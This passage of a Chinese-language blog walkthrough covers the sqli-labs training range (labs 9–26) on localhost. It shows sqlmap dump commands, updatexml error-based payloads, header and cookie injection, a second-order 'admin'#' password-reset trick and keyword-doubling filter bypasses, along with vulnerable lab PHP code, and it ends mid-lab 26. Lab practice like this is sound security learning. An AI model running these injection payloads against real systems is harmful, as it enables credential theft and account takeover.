+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111808174.png" alt="image-20251005111808174"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-9/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> -C username,password --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111832679.png" alt="image-20251005111832679"></p>
+<h2 id="lab10-延时盲注与双引号"><a href="#lab10-延时盲注与双引号" class="headerlink" title="lab10-延时盲注与双引号"></a>lab10-延时盲注与双引号</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-10/?id=1&quot;</span> --dbms=mysql --level=3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113525904.png" alt="image-20251005113525904"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-10/?id=1&quot;</span> --current-db --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113615788.png" alt="image-20251005113615788"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-10/?id=1&quot;</span> -D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113648555.png" alt="image-20251005113648555"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-10/?id=1&quot;</span> -D security -T <span class="built_in">users</span> --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113726055.png" alt="image-20251005113726055"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-10/?id=1&quot;</span> -D security -T <span class="built_in">users</span> -C username,password --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113810838.png" alt="image-20251005113810838"></p>
+<h2 id="lab11-post类型单引号闭合注入"><a href="#lab11-post类型单引号闭合注入" class="headerlink" title="lab11-post类型单引号闭合注入"></a>lab11-post类型单引号闭合注入</h2><p>输入单引号后报错</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005141225467.png" alt="image-20251005141225467"></p>
+<p>简单的绕过<code>admin&#39; #</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006092335442.png" alt="image-20251006092335442"></p>
+<h2 id="lab12-post类型双引号与括号闭合注入"><a href="#lab12-post类型双引号与括号闭合注入" class="headerlink" title="lab12-post类型双引号与括号闭合注入"></a>lab12-post类型双引号与括号闭合注入</h2><p>输入<code>1&quot;</code>后有回显判断u才能在注入点，推测sql语句是 <code>select * from users where username=(&quot;x&quot;) and password=(&quot;y&quot;) LIMIT 0,1</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005143223328.png" alt="image-20251005143223328"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005144346217.png" alt="image-20251005144346217"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005144355594.png" alt="image-20251005144355594"></p>
+<h2 id="lab13-post类型单引号和括号闭合注入"><a href="#lab13-post类型单引号和括号闭合注入" class="headerlink" title="lab13-post类型单引号和括号闭合注入"></a>lab13-post类型单引号和括号闭合注入</h2><p>输入单引号后报错确定是单引号加括号闭合</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142244917.png" alt="image-20251005142244917"></p>
+<p>构造payload<code>admin&#39;) #</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142426857.png" alt="image-20251005142426857"></p>
+<h2 id="lab14-post类型双引号闭合注入"><a href="#lab14-post类型双引号闭合注入" class="headerlink" title="lab14-post类型双引号闭合注入"></a>lab14-post类型双引号闭合注入</h2><p>输入双引号后，判断是双引号闭合</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142511223.png" alt="image-20251005142511223"></p>
+<p>构造payload<code>admin&quot; #</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142547244.png" alt="image-20251005142547244"></p>
+<h2 id="lab15-post类型的布尔盲注"><a href="#lab15-post类型的布尔盲注" class="headerlink" title="lab15-post类型的布尔盲注"></a>lab15-post类型的布尔盲注</h2><blockquote>
+<p>注：lab15和lab16我用sqlmap测试注入类型不知道为什么只能测出来延迟盲注但是测不出来布尔盲注，后来发现是因为正确和错误的返回结果是图片不同，而sqlmap无法检测到这类区别。</p>
+</blockquote>
+<p>将捕获的包写入test.txt</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006095815726.png" alt="image-20251006095815726"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r test.txt -p <span class="built_in">uname</span> --dbms=mysql --technique=B --not-string=<span class="string">&quot;slap.jpg&quot;</span> --flush-session --level 5 --risk 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006095033007.png" alt="image-20251006095033007"></p>
+<p>其余过程与lab8&#x2F;sqlmap相同不做过多赘述</p>
+<h2 id="lab16-post类型的时间盲注"><a href="#lab16-post类型的时间盲注" class="headerlink" title="lab16-post类型的时间盲注"></a>lab16-post类型的时间盲注</h2><p>用sqlmap解决，不做过多赘述</p>
+<h2 id="lab17-post类型UPDATE-报错注入"><a href="#lab17-post类型UPDATE-报错注入" class="headerlink" title="lab17-post类型UPDATE 报错注入"></a>lab17-post类型UPDATE 报错注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006100924958.png" alt="image-20251006100924958"></p>
+<p>存在报错注入，构造payload<code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3) #</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006133532042.png" alt="image-20251006133532042"></p>
+<p>其余过程与lab5大致相同，不过多赘述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),3) #</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),3) #</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e),3) #</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from security.users limit 1,1),0x7e),3) #</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(SELECT x FROM (select concat(username,&#x27;:&#x27;,password) AS x from security.users limit 1,1) AS temp_table),0x7e),3) #</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：可以利用派生表机制绕过<code>You can&#39;t specify target table &#39;X&#39; for update in FROM clause</code>限制</p>
+</blockquote>
+<h2 id="lab18-POST类型的Uagent字段数据头注入"><a href="#lab18-POST类型的Uagent字段数据头注入" class="headerlink" title="lab18-POST类型的Uagent字段数据头注入"></a>lab18-POST类型的Uagent字段数据头注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006135937986.png" alt="image-20251006135937986"></p>
+<p>成功注入后发现userAgent字段有显示，所以尝试在该字段进行注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006140635107.png" alt="image-20251006140635107"></p>
+<p>user-agent存在注入点,接下来就是报错注入,不做过多赘述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),3)  or &#x27;</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),3)  or &#x27;</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e),3)  or &#x27;</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from security.users limit 1,1),0x7e),3)  or &#x27;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意要把前面的user-agent删掉，这是因为如果不删的话构造出的sql语句是<code>INSERT INTO security.uagents (uagent, ip_address, username) VALUES (&#39;user-agent&#39; or payload, &#39;IP&#39;,&#39;uname&#39;);</code>，这会导致mysql尝试将user-agent字符串强制转换为double类型以判断是真还是假，但是由于字符串无法转换为double类型，最重会触发<code>Truncated incorrect DOUBLE value</code>报错导致payload无法执行。</p>
+</blockquote>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160247545.png" alt="image-20251006160247545"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160305895.png" alt="image-20251006160305895"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160331798.png" alt="image-20251006160331798"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160357105.png" alt="image-20251006160357105"></p>
+<h2 id="lab19-post类型的Referer字段数据头注入"><a href="#lab19-post类型的Referer字段数据头注入" class="headerlink" title="lab19-post类型的Referer字段数据头注入"></a>lab19-post类型的Referer字段数据头注入</h2><p>输入正确的账号密码后前端会显示referer，尝试从referer进行sql注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160526567.png" alt="image-20251006160526567"></p>
+<p>测试后发现referer存在注入点</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160708483.png" alt="image-20251006160708483"></p>
+<p>payload与上一关完全一致，不做过多赘述</p>
+<h2 id="lab20-post类型的Cookie-Uagent字段数据头注入"><a href="#lab20-post类型的Cookie-Uagent字段数据头注入" class="headerlink" title="lab20-post类型的Cookie-Uagent字段数据头注入"></a>lab20-post类型的Cookie-Uagent字段数据头注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006161331830.png" alt="image-20251006161331830"></p>
+<p>过程与lab18完全一致，只是注入点在Cookie-Uagent，不做过多赘述</p>
+<blockquote>
+<p>注意Cookie的延迟显示，它出现在第二个报文</p>
+</blockquote>
+<h2 id="lab21-post类型的Cookie-Uagent字段base64编码注入"><a href="#lab21-post类型的Cookie-Uagent字段base64编码注入" class="headerlink" title="lab21-post类型的Cookie-Uagent字段base64编码注入"></a>lab21-post类型的Cookie-Uagent字段base64编码注入</h2><p>与lab20相同，只不过增加了一个base64编码</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007110536933.png" alt="image-20251007110536933"></p>
+<h2 id="lab22-post类型的Cookie-Uagent字段base64编码注入（双引号闭合）"><a href="#lab22-post类型的Cookie-Uagent字段base64编码注入（双引号闭合）" class="headerlink" title="lab22-post类型的Cookie-Uagent字段base64编码注入（双引号闭合）"></a>lab22-post类型的Cookie-Uagent字段base64编码注入（双引号闭合）</h2><p>与lab21相同只不过是双引号闭合</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007110739090.png" alt="image-20251007110739090"></p>
+<h2 id="lab23-GET类型的过滤注释"><a href="#lab23-GET类型的过滤注释" class="headerlink" title="lab23-GET类型的过滤注释"></a>lab23-GET类型的过滤注释</h2><blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取到 id 的值</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号拼接 SQL</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007110910433.png" alt="image-20251007110910433"></p>
+<p>存在注入点，单引号闭合</p>
+<blockquote>
+<p>注意，这道题中不能用order by判断列数，因为它过滤了注释符号，用户只能用闭合符号注入，如果使用order by那么构造出的sql语句是<code>SELECT * FROM users WHERE id=&#39;1&#39; order by 1 or &#39;1&#39;=&#39;1&#39; LIMIT 0,1</code>，数据库解析器会将 <code>1 OR &#39;1&#39;=&#39;1&#39;</code> 作为一个复杂的 排序表达式 来处理，最终导致order by语句被破坏。</p>
+</blockquote>
+<blockquote>
+<p><code>or 1=1</code>和<code>and 1=1</code>：</p>
+<table>
+<thead>
+<tr>
+<th>逻辑运算符</th>
+<th>语句片段</th>
+<th>注入查询的实际行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OR</td>
+<td>… WHERE table_schema&#x3D;’security’ OR ‘1’&#x3D;’1’</td>
+<td>整个 WHERE 子句变为 TRUE，选择 information_schema.tables 中所有记录。</td>
+</tr>
+<tr>
+<td>AND</td>
+<td>… WHERE table_schema&#x3D;’security’ AND ‘1’&#x3D;’1’</td>
+<td>整个 WHERE 子句等价于 WHERE table_schema&#x3D;’security’。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p>接下来的流程和lab1大致相同只不过过滤了注释符号所以可以用<code>and &#39;1&#39;=&#39;1</code>闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-23/?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/Less-23/?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/Less-23/?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/Less-23/?id=-1&#x27; union select 1,(select group_concat(username,password) from security.users),3 and &#x27;1&#x27;=&#x27;1 # 注意不能写成http://localhost/Less-23/?id=-1&#x27; union select group_concat(username),group_concat(password),3 from security.users and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007141121870.png" alt="image-20251007141121870"></p>
+<h2 id="lab24-post类型二次排序注入-存储型注入"><a href="#lab24-post类型二次排序注入-存储型注入" class="headerlink" title="lab24-post类型二次排序注入-存储型注入"></a>lab24-post类型二次排序注入-存储型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// --- 1. 获取和转义用户输入 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);<span class="comment">#当前密码</span></span><br><span class="line">    <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);<span class="comment">#新密码</span></span><br><span class="line">    <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);<span class="comment">#确认密码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 2. 构造并执行 SQL 更新语句 ---</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;<span class="comment">#在修改密码文件中却是直接调用username参数，并没有转义</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果注册一个名为admin’#的用户，那么</p>
+<p>这是原sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$curr_pass&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p>若admin’#进行修改密码时，sql语句会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143522874.png" alt="image-20251007143522874"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143657380.png" alt="image-20251007143657380"></p>
+<p>获取admin权限成功</p>
+<h2 id="lab25-过滤and和or，双写绕过"><a href="#lab25-过滤and和or，双写绕过" class="headerlink" title="lab25-过滤and和or，双写绕过"></a>lab25-过滤and和or，双写绕过</h2><p>存在注入点，闭合符号单引号</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143807892.png" alt="image-20251007143807892"></p>
+<p>测试注入点类型失败，出现报错，推测是因为过滤了”and”</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143944845.png" alt="image-20251007143944845"></p>
+<p>尝试双写绕过成功</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007144012346.png" alt="image-20251007144012346"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007144036127.png" alt="image-20251007144036127"></p>
+<p>接下来的流程和lab1大致相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-25/?id=1&#x27; union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-25/?id=-1&#x27; union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-25/?id=-1&#x27; union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line">http://localhost/Less-25/?id=-1&#x27; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;--+</span><br><span class="line">http://localhost/Less-25/?id=-1&#x27; union select 1,group_concat(username,passwoorrd),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="lab25a-基于GET盲注整形单引号"><a href="#lab25a-基于GET盲注整形单引号" class="headerlink" title="lab25a-基于GET盲注整形单引号"></a>lab25a-基于GET盲注整形单引号</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// --- 1. 获取用户输入 ---</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 2. 黑名单过滤 ---</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);<span class="comment">#过滤or和and，可以双写绕过</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hint</span>=<span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 3. 构造 SQL 查询 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 5. 处理查询结果 (布尔盲注的关键) ---</span></span><br><span class="line">    。。。。。</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果 URL 中没有 &#x27;id&#x27; 参数。</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这关和lab25一样只是没有单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-25a/?id=1 union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-25a/?id=-1 union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-25a/?id=-1 union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line">http://localhost/Less-25a/?id=-1 union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;--+</span><br><span class="line">http://localhost/Less-25a/?id=-1 union select 1,group_concat(username,passwoorrd),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152012138.png" alt="image-20251007152012138"></p>
+<h2 id="lab26-过滤and和or，-和–，斜杠和空格"><a href="#lab26-过滤and和or，-和–，斜杠和空格" class="headerlink" title="lab26-过滤and和or，#和–，斜杠和空格"></a>lab26-过滤and和or，#和–，斜杠和空格</h2><p>存在注入点，且闭合方式为单引号</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152423645.png" alt="image-20251007152423645"></p>
+<p>根据回显判断注释被过滤了，于是用其他方法闭合单引号</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152650228.png" alt="image-20251007152650228"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152845895.png" alt="image-20251007152845895"></p>
+<p>根据回显判断and和空格被过滤，于是用其它方法绕过</p>
